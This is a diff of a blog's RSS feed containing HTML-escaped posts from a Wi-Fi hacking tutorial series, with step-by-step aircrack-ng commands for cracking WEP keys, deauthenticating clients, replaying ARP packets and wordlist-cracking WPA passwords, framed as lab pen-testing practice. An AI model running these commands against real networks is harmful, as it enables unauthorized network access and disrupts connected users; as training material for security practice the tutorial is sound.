+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aireplay-ng -1 0 -e hitme -a 34:08:04:09:3D:38 -h 00:1F:33:F3:51:13 mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This allows us to associate with the access point.&lt;/p&gt;
+
+&lt;h3 id=&quot;generating-weak-ivs&quot;&gt;Generating Weak IVs&lt;/h3&gt;
+
+&lt;p&gt;Now we can launch the &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#interactive-packet-replay-attack&quot;&gt;Interactive Packet Replay Attack&lt;/a&gt;.  THis attack allows us to choose a specific packet for replaying/injecting against our target network.  To achieve our goal, a packet that will be “naturally” successful in generating new initialization vectors must be selected.&lt;/p&gt;
+
+&lt;p&gt;In this scenario, we are going to attempt to use the natural packet selection method of attack.  We are going to capture packets that are within a desired size range and that have the &lt;em&gt;fromDS&lt;/em&gt; flag set.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aireplay-ng -2 -b 34:08:04:09:3D:38 -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;cracking-the-wep-key&quot;&gt;Cracking the WEP Key&lt;/h3&gt;
+
+&lt;p&gt;Once we have captured a substantial number of weak IVs, 250,000 for 64-bit keys and 1.5 million for 128-bit keys, we can now use aircrack-ng to crack the key.  For this we have 2 options.&lt;/p&gt;
+
+&lt;p&gt;We are going to use the &lt;a href=&quot;https://lesperance.io/attaking-wifi-commands#ptw-based-crack&quot;&gt;PTW Crack&lt;/a&gt; method.  It should be noted, this method only works with ARP request/reply packets.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aircrack-ng -z wep1.pcap&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This should result in displaying the network’s WEP key.&lt;/p&gt;
+
+</description>
+        <pubDate>Thu, 23 Apr 2020 00:00:00 -0700</pubDate>
+        <link>http://localhost:4000/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/23/hacking-wep-via-client/</link>
+        <guid isPermaLink="true">http://localhost:4000/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/23/hacking-wep-via-client/</guid>
+      </item>
+    
+      <item>
+        <title>Attacking Wifi Series, Part 2&lt;br /&gt;Hacking WEP With Connected Clients</title>
+        <description>&lt;p&gt;This post will build off of the &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands&quot;&gt;Attacking Wifi Series - Overview &amp;amp; Commands&lt;/a&gt; post.  We will look at how to use different Wifi attack commands to crack the key of a WEP AP with at least 1 connected client.&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;Most technically savvy individuals know that WEP encryption is a serious no-no, though for various compatibility reasons, many corporate environments are still using WEP encryption in their wireless networks.&lt;/p&gt;
+
+&lt;p&gt;For this scenario, we will be using the information below to illustrate how to conduct the attack and attain the WEP key.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Target Information&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;BSSID&lt;/strong&gt;: 34:08:04:09:3D:38&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;AP Channel&lt;/strong&gt;: 3&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;ESSID&lt;/strong&gt;: hitme (Open Authentication)&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Client&lt;/strong&gt;: 00:18:4D:1D:A8:1F&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;mon0&lt;/strong&gt;: 00:1F:33:F3:51:13&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;initial-attack-setup&quot;&gt;Initial Attack Setup&lt;/h3&gt;
+
+&lt;p&gt;The first step in every attack scenario is to place the wireless interface in &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#monitor-mode&quot;&gt;monitor mode&lt;/a&gt; on the same channel as the access point.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;airmon-ng start wlan0 3&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This will set &lt;strong&gt;wlan0&lt;/strong&gt; into monitor mode as &lt;strong&gt;mon0&lt;/strong&gt; on channel 3&lt;/p&gt;
+
+&lt;h3 id=&quot;recon&quot;&gt;Recon&lt;/h3&gt;
+
+&lt;p&gt;Now, an &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#scanning-networks&quot;&gt;Airodump sniffing session&lt;/a&gt; needs to be started and write the capture file to the disk for usage by Aircrack-ng for breaking the WEP key&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;airodump-ng -c 3 –bssid 34:08:04:09:3D:38 -w wep1 mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This will start airodump-ng, listening on Channel 3 and filtering on the BSSID and saving the output to &lt;em&gt;wep1&lt;/em&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;authenticate&quot;&gt;Authenticate&lt;/h3&gt;
+
+&lt;p&gt;Now, we conduct a &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#fake-authentication&quot;&gt;fake authentication attack&lt;/a&gt; against the AP&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aireplay-ng -1 0 -e hitme -a 34:08:04:09:3D:38 -h 00:1F:33:F3:51:13 mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This allows us to associate with the access point.&lt;/p&gt;
+
+&lt;h3 id=&quot;generating-weak-ivs&quot;&gt;Generating Weak IVs&lt;/h3&gt;
+
+&lt;p&gt;Now we can launch the &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#arp-request-replay-attack&quot;&gt;ARP Request Replay Attack&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aireplay-ng -3 -b 34:08:04:09:3D:38 -h 00:1F:33:F3:51:13 mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;You may have to wait a bit until an ARP request shows up on the network, this will depend on the amount of traffic on the network.  You will see the &lt;em&gt;Data&lt;/em&gt; field in the airodump session rapidly increasing as the weak IVs are being captured.&lt;/p&gt;
+
+&lt;p&gt;To help with this, we can use the &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#deauthentication-attack&quot;&gt;Deauthentication Attack&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This will deauthenticate the client from the AP, forcing the client to send ARP packets to the AP as it reconnects, which we will need to replay to help force the AP to generate a large number of weak IVs.&lt;/p&gt;
+
+&lt;h3 id=&quot;cracking-the-wep-key&quot;&gt;Cracking the WEP Key&lt;/h3&gt;
+
+&lt;p&gt;Once we have captured a substantial number of weak IVs, 250,000 for 64-bit keys and 1.5 million for 128-bit keys, we can now use aircrack-ng to crack the key.  For this we have 2 options.&lt;/p&gt;
+
+&lt;p&gt;The first method, is the default &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#iv-based-crack&quot;&gt;IV-based cracking&lt;/a&gt; method.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aircrack-ng wep1.pcap&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The other option, which typically is a faster option, is the &lt;a href=&quot;https://lesperance.io/attaking-wifi-commands#ptw-based-crack&quot;&gt;PTW Crack&lt;/a&gt; method.  It should be noted, this method only works with ARP request/reply packets.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aircrack-ng -z wep1.pcap&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The result of either of these commands should result in the WEP Key&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 18 Mar 2020 00:00:00 -0700</pubDate>
+        <link>http://localhost:4000/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/03/18/hacking-wep-connected-clients/</link>
+        <guid isPermaLink="true">http://localhost:4000/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/03/18/hacking-wep-connected-clients/</guid>
+      </item>
+    
+      <item>
+        <title>Attacking Wifi Series, Part 1&lt;br /&gt; Overview &amp; Commands</title>
+        <description>&lt;p&gt;Welcome to the Attacking Wifi Series.  This series of blog posts will cover different scenarios around pen testing and Hacking Wifi.&lt;/p&gt;
+
+&lt;p&gt;This post will highlight many of the different aircrack-ng commands used in hacking/pen testing wireless networks.  This post does not go into the how, but is more of a reference of the commands and parameters.&lt;/p&gt;
+
+&lt;h2 id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;#posts-in-this-series&quot;&gt;Posts in this series&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#general&quot;&gt;General&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#monitor-mode&quot;&gt;Monitor Mode&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#scanning-networks&quot;&gt;Scanning Networks&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#deauthentication-attack&quot;&gt;Deauthentication Attack&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#cracking&quot;&gt;Cracking&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#iv-based-crack&quot;&gt;IV-based Crack&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ptw-based-crack&quot;&gt;PTW Crack&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#word-list-based-crack&quot;&gt;Word List Crack&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#airolib-db-crack&quot;&gt;Airolib DB Crack&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#jtr-based-crack&quot;&gt;JTR-based Crack&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#wep-attacks&quot;&gt;WEP Attacks&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#fake-authentication&quot;&gt;Fake Authentication&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#arp-request-replay-attack&quot;&gt;ARP Request Replay Attack&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#interactive-packet-replay-attack&quot;&gt;Interactive Packet Replay Attack&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#korek-chopchop-attack&quot;&gt;KoreK ChopChop Attack&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#fragmentation-attack&quot;&gt;Fragmentation Attack&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#craft-arp-request-packet&quot;&gt;Craft ARP Request Packet&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#inject-packet&quot;&gt;Inject Packet&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#fake-shared-key-authentication&quot;&gt;Fake Shared Key Authentication&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#wpa-attacks&quot;&gt;WPA Attacks&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#cowpatty-attack&quot;&gt;coWPAtty Attack&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#pyrit-sniff&quot;&gt;Pyrit Sniff&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;&amp;amp;pyrit-crack-dictionary&quot;&gt;Pyrit Dictionary Crack&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#pyrit-crack-database&quot;&gt;Pyrit Database Crack&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;posts-in-this-series&quot;&gt;Posts in this Series&lt;/h2&gt;
+
+&lt;p&gt;Since this series will be covering several Wifi hacking scenarios, we have decided to make each scenario its own post.  Each post will walk you through the steps of the attack.  While the steps provided are sufficient for carrying out the attacks, it is recommended that you attain an understanding of the attacks and why they work.  Information is provided to allow you to setup each scenario in your own wifi lab so that you can actually practice the attack.  If you don’t have a spare AP to use for this, check out &lt;a href=&quot;https://lesperance.io/setting-up-wifi-ap-rpi&quot;&gt;Rasperry Pi as an Wifi AP&lt;/a&gt; on how to create a wifi ap on a raspberry pi for the purpose of practicing hacking wifi.&lt;/p&gt;
+
+&lt;p&gt;Below is a list of posts for this series.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;Overview &amp;amp; Commands&lt;/em&gt; &amp;lt;– This post&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://lesperance.io/hacking-wep-connected-clients&quot;&gt;Hacking WEP with Connected Clients&lt;/a&gt; - Published on 3/18/20&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://lesperance.io/hacking-wep-via-client&quot;&gt;Hacking WEP via a Client&lt;/a&gt; - Published on 4/23/20&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://lesperance.io/hacking-clientless-wep&quot;&gt;Hacking Clientless WEP Networks&lt;/a&gt; - Published on 4/25/20&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://lesperance.io/bypassing-wep-share-key-authentication&quot;&gt;Bypassing WEP Shared Key Authentication&lt;/a&gt; - Published on 4/27/20&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://lesperance.io/hacking-wpa-wpa2-psk&quot;&gt;Hacking WPA/WPA2 PSK&lt;/a&gt; - Published on 5/4/20&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;general&quot;&gt;General&lt;/h2&gt;
+
+&lt;h3 id=&quot;monitor-mode&quot;&gt;Monitor Mode&lt;/h3&gt;
+&lt;p&gt;There are a couple different options for putting your wifi adapter into monitor mode.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iw dev &amp;lt;interface&amp;gt; set monitor none&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;airmon-ng start &amp;lt;interface&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;scanning-networks&quot;&gt;Scanning Networks&lt;/h3&gt;
+&lt;p&gt;Airodump-ng is used to scan for wifi networks and clients that are in the range of your wireless card&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;airodump-ng -c &amp;lt;channel&amp;gt; -w &amp;lt;capture&amp;gt; --wps --band abg --essid &amp;lt;essid&amp;gt; --bssid &amp;lt;bssid&amp;gt; &amp;lt;int&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The required parameters&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;int&amp;gt;&lt;/code&gt; The wireless interface that is in monitor mode&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The following flags are all optional&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-c &amp;lt;channel&amp;gt;&lt;/code&gt; This will filter your scan to a specific wifi channel&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--wps&lt;/code&gt; This flag will include WPS information for wireless networks found&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-w &amp;lt;capture&amp;gt;&lt;/code&gt; This flag will write the scan results to a file&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--band &amp;lt;bands&amp;gt;&lt;/code&gt; This flag allows you to only scan wifi networks operating on specified bands&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--essid &amp;lt;essid&amp;gt;&lt;/code&gt; This flag will filter the scan to a specific Client&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--bssid &amp;lt;bssid&amp;gt;&lt;/code&gt; This flag will filter the scan to a specific AP&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;deauthentication-attack&quot;&gt;Deauthentication Attack&lt;/h3&gt;
+&lt;p&gt;This attacks sends disassociate packets to one or more clients connected to a specific AP&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aireplay-ng -0 &amp;lt;num&amp;gt; -a &amp;lt;ap&amp;gt; -c &amp;lt;client&amp;gt; &amp;lt;int&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;All parameters and flags are required&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-0&lt;/code&gt; Deauthentication attack method&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;num&amp;gt;&lt;/code&gt; The number of deauths to send, 0 will send continuously&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a &amp;lt;ap&amp;gt;&lt;/code&gt; The mac address of the AP&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-c &amp;lt;client&amp;gt;&lt;/code&gt; The mac address of the client to deauthenticate&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;int&amp;gt;&lt;/code&gt; The wireless interface to use&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;cracking&quot;&gt;Cracking&lt;/h2&gt;
+
+&lt;p&gt;The following are various methods that can be used to crack the authentication of wireless networks.&lt;/p&gt;
+
+&lt;h3 id=&quot;iv-based-crack&quot;&gt;IV-based Crack&lt;/h3&gt;
+
+&lt;p&gt;The following is a method of IV-based cracking.  This is aircrack-ng’s default
+methed of cracking when no flags are provided.  This method only works for WEP,
+not WPA/WPA2/WPA3.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aircrack-ng &amp;lt;capture&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;ptw-based-crack&quot;&gt;PTW-based Crack&lt;/h3&gt;
+
+&lt;p&gt;The PTW attack is both the newest and most powerful WEP attack.  It only
+require 20,000 to 40,000 packets to be successful, though in some cases as many
+as 70,000 packets could be needed for a successful attack.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aircrack-ng -z &amp;lt;capture&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-z&lt;/code&gt; Invokes WEP PTW Attack mode&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;word-list-based-crack&quot;&gt;Word List-based Crack&lt;/h3&gt;
+
+&lt;p&gt;This method works for both WEP and WPA-PSK cracking.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aircrack-ng -w &amp;lt;wordlist&amp;gt; &amp;lt;capture&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-w &amp;lt;wordlist&amp;gt;&lt;/code&gt; The wordlist to use to try and crack WEP/WPA-PSK&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;If the capture file does not contain the APs SSID, you will have to use the following command to specify the extra information aircrack needs for generating the PMKs&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aircrack-ng -w &amp;lt;wordlist&amp;gt; -e &amp;lt;essid&amp;gt; -b &amp;lt;bssid&amp;gt; &amp;lt;capture&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e &amp;lt;essid&amp;gt;&lt;/code&gt; The SSID of the AP&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-b &amp;lt;bssid&amp;gt;&lt;/code&gt; The mac address of the AP&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;airolib-db-crack&quot;&gt;Airolib DB Crack&lt;/h3&gt;
+
+&lt;p&gt;Airolib-ng is a tool for managing and storing ESSIDs and password lists, compute their Pairwise Master Keys, and use them to crack WPA and WPA2 passwords.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aircrack-ng -r &amp;lt;dbName&amp;gt; &amp;lt;capture&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-r &amp;lt;dbName&amp;gt; - The name of the airolib-ng database&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;jtr-based-crack&quot;&gt;JTR-based Crack&lt;/h3&gt;
+
+&lt;p&gt;This method uses John the Ripper and a wordlist while applying word mangling rules to attempt to crack a WPA/WPA2 Password&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john --wordlist=&amp;lt;wordlist&amp;gt; --rules --stdout | aircrack-ng -e &amp;lt;essid&amp;gt; -w - &amp;lt;capture&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--wordlist=&amp;lt;wordlist&amp;gt; - The word list to use&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--rules - apply word mangling rules&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;wep-attacks&quot;&gt;WEP Attacks&lt;/h2&gt;
+
+&lt;h3 id=&quot;fake-authentication&quot;&gt;Fake Authentication&lt;/h3&gt;
+
+&lt;p&gt;The fake authentication attack allows you to associate to an access point using either of the two types of WEP authentication: the open system and shared key authentication.&lt;/p&gt;
+
+&lt;p&gt;This attack is useful in scenarios where there are no associated clients and you need to fake an authentication to the AP.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aireplay-ng -1 0 -e &amp;lt;essid&amp;gt; -a &amp;lt;ap&amp;gt; -h &amp;lt;you&amp;gt; &amp;lt;interface&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-1 - Fake Authentication Attack&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0 - The reassociation timing in seconds&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e &amp;lt;essid&amp;gt; - The wireless network name (ESSID)&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a &amp;lt;ap&amp;gt; - The AP MAC address&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-h &amp;lt;you&amp;gt; - Your attacking MAC address&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;arp-request-replay-attack&quot;&gt;ARP Request Replay Attack&lt;/h3&gt;
+
+&lt;p&gt;The ARP request replay attack is the most effective way to generate new initialization vectors and of all the attacks Aireplay has to offer, this attack is probably the most reliable.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aireplay-ng -3 -b &amp;lt;ap&amp;gt; -h &amp;lt;you&amp;gt; &amp;lt;interface&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-3 - ARP Request Replay Attack&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-b &amp;lt;ap&amp;gt; - The AP MAC address&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-h &amp;lt;you&amp;gt; - Your attacking MAC address&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;For this attack, your wireless card needs to be in monitor mode and you will need either the MAC address of an associated client or your own MAC address after having performed a fake authentication with the AP.&lt;/p&gt;
+
+&lt;h3 id=&quot;interactive-packet-replay-attack&quot;&gt;Interactive Packet Replay Attack&lt;/h3&gt;
+
+&lt;p&gt;The Interactive Packet Replay attack allows you to choose a specific packet for replaying/injecting against the target network.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aireplay-ng -2 -b &amp;lt;ap&amp;gt; -d ff:ff:ff:ff:ff:ff -f 1 -m 68 -n 86 &amp;lt;interface&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-2 - Interactive Packet Replay Attack&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-b &amp;lt;ap&amp;gt; - The AP MAC address&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-d ff:ff:ff:ff:ff:ff - Select packets with a broadcast destination address&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-t 1 - Select packets with the &quot;To Distribution System&quot; flag set&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-m &amp;lt;num&amp;gt; - Minimum packet size&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-n &amp;lt;num&amp;gt; - Maximum packet size&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;korek-chopchop-attack&quot;&gt;KoreK chopchop attack&lt;/h3&gt;
+
+&lt;p&gt;The Korek chopchop attack, when successful, can decrypt a WEP data packet without knowing the WEP key and can even work against dynamic WEP.&lt;/p&gt;
+
+&lt;p&gt;This attack does not recover the WEP key itself; it merely reveals the plaintext of the packets.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aireplay-ng -4 -b &amp;lt;ap&amp;gt; -h &amp;lt;you&amp;gt; &amp;lt;interface&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
